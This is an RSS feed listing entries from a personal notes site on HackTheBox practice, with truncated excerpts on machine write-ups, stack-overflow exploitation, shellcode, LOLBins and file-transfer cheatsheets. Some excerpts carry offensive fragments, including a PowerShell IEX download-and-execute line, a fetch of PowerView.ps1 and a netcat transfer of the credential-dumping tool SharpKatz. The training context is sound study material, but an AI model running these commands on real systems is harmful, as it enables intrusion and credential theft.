<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>htb on</title><link>https://pietraferreira.github.io/quartz/tags/htb/</link><description>Recent content in htb on</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><atom:link href="https://pietraferreira.github.io/quartz/tags/htb/index.xml" rel="self" type="application/rss+xml"/><item><title>2022-07-24</title><link>https://pietraferreira.github.io/quartz/notes/daily/2022-07-24/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/daily/2022-07-24/</guid><description>2022-07-24 HTB - Catch Catching an API key out of an Android APK file.
Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 ~/htb/catch &amp;gt; sudo nmap -sC -sV -oA nmap/catch 10.</description></item><item><title>Binary Exploitation - By HTB</title><link>https://pietraferreira.github.io/quartz/notes/binary-exploitation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/binary-exploitation/</guid><description>Binary Exploitation 00 Check file vulnerabilities: 1 checksec --file &amp;lt;filename&amp;gt; Gets rid of Stack, NX and PIE protection (-m32 changes to 32bits): 1 gcc &amp;lt;filename&amp;gt;.</description></item><item><title>CPU Architecture</title><link>https://pietraferreira.github.io/quartz/notes/cpu-architecture/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/cpu-architecture/</guid><description>CPU Architecture This is part of a guide that you can find here.
A Von-Neumann architecture consists of four functional units:</description></item><item><title>Endianness</title><link>https://pietraferreira.github.io/quartz/notes/endianness/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/endianness/</guid><description>Endianness This is part of a guide that you can find here.
Bytes are loaded in different order, called endianness.</description></item><item><title>File Encryption</title><link>https://pietraferreira.github.io/quartz/notes/file-encryption/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/file-encryption/</guid><description>File Encryption Windows 1 2 PS Import-Module .\Invoke-AESEncryption.ps1 PS Invoke-AESEncryption.ps1 -Mode Encrypt -Key &amp;#39;p4ssw0rd&amp;#39; -Path .\scan-results.txt Linux Encrypt 1 openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.</description></item><item><title>File Transfer Cheatsheet</title><link>https://pietraferreira.github.io/quartz/notes/htb-file-transfer-cheatsheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/htb-file-transfer-cheatsheet/</guid><description>File Transfer Cheatsheet Command Description Â Invoke-WebRequest https://&amp;lt;snip&amp;gt;/PowerView.ps1 -OutFile PowerView.ps1 Download a file with PowerShell IEX (New-Object Net.</description></item><item><title>File Transfers</title><link>https://pietraferreira.github.io/quartz/notes/htb-file-transfers/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/htb-file-transfers/</guid><description>File Transfers Netcat ( here) RDP ( here) File Encryption Nginx Living off the land Windows Download Operations PowerShell Base64 Encode and Decode We can encode a file to a base64 string, copy contents from the terminal and then perform the reverse operation, meaning decoding the file in the original content.</description></item><item><title>Generate Shellcode</title><link>https://pietraferreira.github.io/quartz/notes/generate-shellcode/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/generate-shellcode/</guid><description>Generate Shellcode This is part of a guide that you can find here.
We have to pay attention to:</description></item><item><title>HackTheBox Cheatsheets</title><link>https://pietraferreira.github.io/quartz/notes/hackthebox-cheatsheets/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/hackthebox-cheatsheets/</guid><description>HackTheBox Cheatsheets MSFconsole Commands Command Description show exploits Show all exploits within the Framework.</description></item><item><title>HTB - Driver</title><link>https://pietraferreira.github.io/quartz/notes/htb-driver/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/htb-driver/</guid><description>HTB - Driver Printer exploitation!!
IP: 10.10.11.106
1 sudo nmap -sC -sV -oA driver.nmap $ip Where:</description></item><item><title>HTB - Pandora</title><link>https://pietraferreira.github.io/quartz/notes/htb-pandora/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/htb-pandora/</guid><description>HTB - Pandora We first enumerate:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 sudo nmap -sC -sV -oA pandora 10.</description></item><item><title>HTB - Secret</title><link>https://pietraferreira.github.io/quartz/notes/htb-secret/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/htb-secret/</guid><description>HTB - Secret It is all about secret ways to extract information from applications.
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ~/htb/secret &amp;gt; sudo nmap -sC -sV -oA nmap/secret 10.</description></item><item><title>Identify Return Address</title><link>https://pietraferreira.github.io/quartz/notes/identify-return-address/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/identify-return-address/</guid><description>Identify Return Address We need a memory address where our NOPs are located to tell the EIP to jump to it.</description></item><item><title>Introduction to Networking</title><link>https://pietraferreira.github.io/quartz/notes/htb-intro-networking/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/htb-intro-networking/</guid><description>Introduction to Networking Overview There is a wide array of topologies (mesh, tree, star), mediums (ethernet, fiber, coax, wireless) and protocols (TCP, UDP, IPX).</description></item><item><title>LOLBins</title><link>https://pietraferreira.github.io/quartz/notes/lolbins/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/lolbins/</guid><description>LOLBins Aka Living off the land binaries, which are binaries that an attacker can use to perform actions beyond their original purpose.</description></item><item><title>Netcat</title><link>https://pietraferreira.github.io/quartz/notes/netcat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/netcat/</guid><description>Netcat Networking utility for reading from and writing to network connections using TCP or UDP.
Listening 1 victim@target:~$ nc -l -p 8080 &amp;gt; SharpKatz.</description></item><item><title>Nginx</title><link>https://pietraferreira.github.io/quartz/notes/nginx/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/nginx/</guid><description>Nginx Used for transferring files to Apache.
Create Directory to Handle Uploaded Files 1 sudo mkdir -p /var/www/uploads/SecretUploadDirectory Change the Owner to www-data 1 sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory Create Nginx Configuration File In /etc/nginx/sites-available/upload.</description></item><item><title>RDP</title><link>https://pietraferreira.github.io/quartz/notes/rdp/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/rdp/</guid><description>RDP Stands for Remote Desktop Protocol.
Mounting using rdesktop 1 rdesktop 10.10.10.132 -d HTB -u administrator -p &amp;#39;Password&amp;#39; -r disk:linux=&amp;#39;home/user/rdesktop/files&amp;#39; 1 xfreerdp /v:10.</description></item><item><title>Stack-based Overflow - Linux x86</title><link>https://pietraferreira.github.io/quartz/notes/htb-stack-based-overflow-linux/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/htb-stack-based-overflow-linux/</guid><description>Stack-based Overflow - Linux x86 They are caused by incorrect program code, which cannot process too large amounts of data correctly by the CPU and can, therefore, manipulate the CPU&amp;rsquo;s processing.</description></item><item><title>Stack-overflow Prevention Techniques and Mechanisms</title><link>https://pietraferreira.github.io/quartz/notes/so-prevention-techniques/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/so-prevention-techniques/</guid><description>Stack-overflow Prevention Techniques and Mechanisms Security mechanisms:
Canaries Address Space Layout Randomisation ( ASLR) Data Execution Prevention (DEP) Canaries They are known values written to the stack between buffer and control data to detect buffer overflows.</description></item><item><title>Take Control of EIP</title><link>https://pietraferreira.github.io/quartz/notes/take-control-eip/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://pietraferreira.github.io/quartz/notes/take-control-eip/</guid><description>Take Control of EIP This is part of a guide that you can find here.
We need to get the instruction pointer (EIP) under control so we can tell it to which address to jump.</description></item></channel></rss>